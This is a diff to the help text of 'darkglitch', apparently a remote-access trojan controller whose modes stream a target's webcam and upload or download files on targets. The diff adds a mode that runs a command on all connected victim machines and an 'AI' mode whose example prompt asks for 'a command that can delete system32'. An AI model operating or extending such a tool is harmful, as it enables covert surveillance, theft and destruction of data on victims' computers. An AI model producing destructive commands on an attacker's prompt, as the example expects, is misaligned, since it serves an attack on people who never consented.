@@ -26,6 +26,8 @@ MODES:
     darkglitch -s <client_id>             Stream webcam from target
     darkglitch -u <client_id> <src>       Upload file to target
     darkglitch -d <client_id> <src>       Download file from target
+    darkglitch -all <cmd>                 Target all connected clients using command
+    darkglitch -ai <client_id> <prompt>   Using Prompt to execute command
 
 GENERAL OPTIONS:
   -h, --help                              Display this help message
@@ -56,6 +58,9 @@ EXAMPLES:
   # Download file from target
   darkglitch -d <client_id> <src> [dst]
 
+  # All option is to send a command to all available/online targets
+  darkglitch -all "whoami"
+  
   # AI
   darkglitch -ai <client_id> "give me a command that can delete system32"
 
